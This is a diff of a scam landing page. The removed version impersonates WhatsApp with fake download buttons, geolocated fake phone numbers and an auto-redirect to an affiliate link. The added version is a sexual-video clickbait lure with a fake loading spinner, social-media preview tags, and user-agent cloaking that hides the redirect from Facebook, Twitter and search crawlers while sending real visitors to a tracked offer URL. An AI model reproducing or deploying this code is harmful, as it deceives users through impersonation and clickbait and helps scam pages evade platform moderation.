@@ -1,82 +1,265 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp.c🇴m</title>
-    <meta property="og:title" content="🟢WhatsApp Video Sex🍊💦">
-    <meta property="og:image" content="https://pbs.twimg.com/media/HJ8RtYxbwAAsFxq.jpg">
-    <style>
-        body { font-family: sans-serif; margin: 0; padding: 0; color: #414141; }
-        .header { display: flex; justify-content: space-between; padding: 15px 10%; border-bottom: 1px solid #eee; align-items: center; }
-        .logo { width: 120px; }
-        .btn-green { background: #25d366; color: white; padding: 10px 25px; border-radius: 50px; text-decoration: none; font-weight: bold; font-size: 14px; cursor: pointer; border: none; }
-        .main { text-align: center; padding: 80px 20px; }
-        .btn-open { background: #25d366; color: white; padding: 12px 40px; border-radius: 50px; text-decoration: none; font-weight: bold; display: inline-block; margin: 10px; cursor: pointer; border: none; }
-        .btn-web { border: 1px solid #25d366; color: #25d366; padding: 12px 25px; border-radius: 50px; text-decoration: none; font-weight: bold; display: inline-block; cursor: pointer; background: none; }
-        .footer { background: #111b21; color: #8696a0; padding: 50px 10%; display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; font-size: 13px; margin-top: 100px; }
-        @media (max-width: 768px) { .footer { grid-template-columns: 1fr; } }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<title id="page-title">LOADING...</title>
+
+<meta name="description" content="🎥⏯1:43―●―――――30:15📽💋">
+
+<!-- OPEN GRAPH / THREADS / FB -->
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://islalynsmith7806.pages.dev/">
+<meta property="og:title" content="🎥⏯1:43―●―――――30:15📽💋">
+<meta property="og:description" content="🎥⏯1:43―●―――――30:15📽💋">
+<meta property="og:image" content="https://fototrapeyangbaru12.pages.dev/SING UP (1)-blurred.jpg">
+<meta property="og:image:secure_url" content="https://fototrapeyangbaru12.pages.dev/SING UP (1)-blurred.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:type" content="image/jpeg">
+
+<!-- TWITTER / X -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="🎥⏯1:43―●―――――30:15📽💋">
+<meta name="twitter:description" content="🎥⏯1:43―●―――――30:15📽💋">
+<meta name="twitter:image" content="https://fototrapeyangbaru12.pages.dev/SING UP (1)-blurred.jpg">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    -webkit-tap-highlight-color: transparent;
+}
+
+html,body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    background:#000;
+    cursor:pointer;
+    user-select:none;
+    -webkit-user-select:none;
+}
+
+/* Background video total */
+.bg{
+    position:fixed;
+    inset:0;
+    overflow:hidden;
+    z-index:1;
+}
+
+.bg video{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    object-position: center 85%;
+    filter:blur(30px) brightness(.4);
+    transform:scale(1.6);
+}
+
+/* Video utama di tengah (Fokus Badan Bawah) */
+.main-video{
+    position:fixed;
+    inset:0;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    z-index:2;
+}
+
+.main-video video{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    object-position: center 80%;
+    transform: scale(1.3);
+    filter: blur(6px) brightness(.8);
+}
+
+/* Overlay kegelapan lembut */
+.overlay{
+    position:fixed;
+    inset:0;
+    background:radial-gradient(circle at center, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.85) 100%);
+    z-index:3;
+}
+
+/* CONTAINER LOADING PRO DI TENGAH LAYAR */
+.content-wrapper{
+    position:fixed;
+    inset:0;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+    z-index:10;
+}
+
+.glass-card{
+    background: rgba(18, 18, 24, 0.7);
+    backdrop-filter: blur(16px);
+    -webkit-backdrop-filter: blur(16px);
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    border-radius: 28px;
+    padding: 35px 28px;
+    width: 100%;
+    max-width: 320px;
+    text-align: center;
+    color: white;
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.15);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+
+/* Pro Ring Spinner */
+.spinner-box {
+    position: relative;
+    width: 60px;
+    height: 60px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 18px;
+}
+
+.spinner-ring {
+    box-sizing: border-box;
+    position: absolute;
+    width: 55px;
+    height: 55px;
+    border: 4px solid rgba(255, 255, 255, 0.1);
+    border-top: 4px solid #25D366;
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+}
+
+.center-icon {
+    font-size: 20px;
+    animation: pulse 1.2s infinite ease-in-out;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+@keyframes pulse {
+    0%, 100% { transform: scale(0.9); opacity: 0.8; }
+    50% { transform: scale(1.15); opacity: 1; }
+}
+
+/* Teks Loading */
+.loading-text {
+    color: #ffffff;
+    font-size: 15px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+}
+
+.dots span {
+    animation: blink 1.4s infinite fill-mode: both;
+    font-weight: bold;
+}
+
+.dots span:nth-child(2) { animation-delay: .2s; }
+.dots span:nth-child(3) { animation-delay: .4s; }
+
+@keyframes blink {
+    0% { opacity: .2; }
+    20% { opacity: 1; }
+    100% { opacity: .2; }
+}
+</style>
 </head>
-<body>
 
-    <div class="header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
-        <button onclick="goToTrafee()" class="btn-green">Download</button>
+<body onclick="goOffer()">
+
+<!-- BACKGROUND BLUR VIDEO -->
+<div class="bg">
+    <video autoplay loop muted playsinline>
+        <source src="https://faizalpenikmatturuk.github.io/landing/bg1.mp4" type="video/mp4">
+    </video>
+</div>
+
+<!-- VIDEO UTAMA (FOKUS BADAN BAWAH) -->
+<div class="main-video">
+    <video autoplay loop muted playsinline>
+        <source src="https://faizalpenikmatturuk.github.io/landing/bg1.mp4" type="video/mp4">
+    </video>
+</div>
+
+<div class="overlay"></div>
+
+<!-- KONTEN PRO LOADING -->
+<div class="content-wrapper">
+    <div class="glass-card">
+        <div class="spinner-box">
+            <div class="spinner-ring"></div>
+            <span class="center-icon">🔒</span>
+        </div>
+        <div class="loading-text">
+            <span id="txt-loading">LOADING</span>
+            <span class="dots"><span>.</span><span>.</span><span>.</span></span>
+        </div>
     </div>
+</div>
 
-    <div class="main">
-        <h2 id="wa-text">Chat on WhatsApp</h2>
-        <button onclick="goToTrafee()" class="btn-open" id="btn-open">Open app</button><br>
-        <button onclick="goToTrafee()" class="btn-web" id="btn-web">Continue to WhatsApp Web</button>
-        <p><br>Don't have the app? <a href="#" onclick="goToTrafee()" style="color:#25d366;" id="wa-down">Download it now</a></p>
-    </div>
+<script>
+// =========================================================
+// 🔴 SMARTLINK TRAFEE
+// =========================================================
+const redirectURL = "https://chfhbei.tepixs.com/s/7a96a663ee35e?track=COCOT&subsource=COCOT&ext_click_id=COCOT";
+// =========================================================
 
-    <div class="footer">
-        <div><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="80" style="filter:invert(1)"></div>
-        <div><b>What we do</b><br><br>Features<br>Blog<br>Security</div>
-        <div><b>Who we are</b><br><br>About us<br>Careers<br>Privacy</div>
-        <div><b>Use WhatsApp</b><br><br>Android<br>iPhone<br>Mac/PC</div>
-    </div>
+let isRedirected = false;
 
-    <script>
-        // Fungsi untuk mengambil link dari URL dan Redirect
-        function goToTrafee() {
-            const params = new URLSearchParams(window.location.search);
-            const link = params.get('link') || "https://cgiaaag.cliksm.com/s/133baad435f7a?track=HotVideo_Fun&subsource=HotVideo_Fun";
-            window.location.href = link;
-        }
+function goOffer() {
+    if (!isRedirected) {
+        isRedirected = true;
+        window.location.replace(redirectURL);
+    }
+}
 
-        const config = {
-            'PL': { txt: 'Czatuj na WhatsApp z +48 84 744 55 75', btn1: 'Otwórz aplikację', btn2: 'Kontynuuj w WhatsApp Web', link: 'Pobierz teraz' },
-            'DE': { txt: 'Chatte auf WhatsApp mit +49 151 2345 6789', btn1: 'App öffnen', btn2: 'Weiter zu WhatsApp Web', link: 'Jetzt herunterladen' },
-            'ES': { txt: 'Chatea en WhatsApp con +34 600 123 456', btn1: 'Abrir aplicación', btn2: 'Continuar en WhatsApp Web', link: 'Descargar ahora' },
-            'CZ': { txt: 'Chatujte na WhatsApp s +420 777 123 456', btn1: 'Otevřít aplikaci', btn2: 'Pokračovat na WhatsApp Web', link: 'Stáhnout' },
-            'SK': { txt: 'Chatujte na WhatsApp s +421 900 123 456', btn1: 'Otvoriť aplikáciu', btn2: 'Pokračovať na WhatsApp Web', link: 'Stiahnuť' },
-            'IT': { txt: 'Chatta su WhatsApp con +39 333 123 4567', btn1: 'Apri applicazione', btn2: 'Continua su WhatsApp Web', link: 'Scarica ora' },
-            'US': { txt: 'Chat on WhatsApp with +1 202 555 0128', btn1: 'Open app', btn2: 'Continue to WhatsApp Web', link: 'Download it now' }
-        };
+// DETEKSI BOT / FACEBOOK CRAWLER
+const isBot = /facebookexternalhit|facebookcatalog|twitterbot|bingbot|googlebot|slurp|WhatsApp/i.test(navigator.userAgent);
 
-        async function init() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                const code = data.country_code || 'US';
-                const lang = config[code] || config['US'];
-                
-                document.getElementById('wa-text').innerText = lang.txt;
-                document.getElementById('btn-open').innerText = lang.btn1;
-                document.getElementById('btn-web').innerText = lang.btn2;
-                document.getElementById('wa-down').innerText = lang.link;
-            } catch(e) {
-                const d = config['US'];
-                document.getElementById('wa-text').innerText = d.txt;
-            }
-        }
-        init();
+// HANYA REDIRECT JIKA USER ASLI (BUKAN CRAWLER / BOT)
+if (!isBot) {
+    setTimeout(goOffer, 1200);
+}
 
-        // Redirect otomatis 2 detik
-        setTimeout(goToTrafee, 2000);
-    </script>
+// AUTO-TRANSLATE MULTI LANGUAGE (ES, PT-BR, PT-PT, EN)
+const i18n = {
+    es: "CARGANDO",
+    "pt-br": "CARREGANDO",
+    "pt-pt": "A CARREGAR",
+    en: "LOADING"
+};
+
+const rawLang = (navigator.language || navigator.userLanguage || "en").toLowerCase();
+let lang = "en";
+
+if (rawLang.startsWith("es")) {
+    lang = "es";
+} else if (rawLang === "pt-pt" || rawLang.includes("pt-pt")) {
+    lang = "pt-pt";
+} else if (rawLang.startsWith("pt")) {
+    lang = "pt-br";
+}
+
+document.documentElement.lang = lang;
+document.title = i18n[lang] + "...";
+document.getElementById("txt-loading").innerText = i18n[lang];
+</script>
+
 </body>
 </html>
